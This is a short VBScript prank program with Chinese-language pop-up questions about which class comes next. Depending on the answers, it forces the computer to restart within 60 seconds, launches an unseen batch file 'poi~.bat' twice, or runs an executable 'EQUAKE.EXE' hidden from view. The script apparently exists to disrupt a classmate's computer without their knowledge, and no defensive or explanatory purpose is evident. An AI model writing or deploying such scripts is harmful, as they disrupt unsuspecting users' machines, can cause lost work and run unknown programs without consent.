Dim Response
Set ws = CreateObject("Wscript.Shell") 
Response = Msgbox ("请问：下一节是英语课吗？" , 36 , "提問")
If Response = vbYes Then
Msgbox "那就对了233", 0 ,"呵呵呵呵呵"
ws.run "cmd /k shutdown /r /t 60"
ws.run "cmd /k poi~.bat"
ws.run "cmd /k poi~.bat"
End If
If Response = vbNo Then
Response = Msgbox ("请问：下一节是数学课吗？" , 36 , "提問")
If Response = vbYes Then
Msgbox "没事了没事了没事了", 0 ,"没事了"
End If
If Response = vbNo Then
Response = Msgbox ("请问：下一节是物理/化学课吗？" , 36 , "提問")
If Response = vbYes Then
ws.run "cmd /k EQUAKE.EXE",vbhide
End If
End If
End If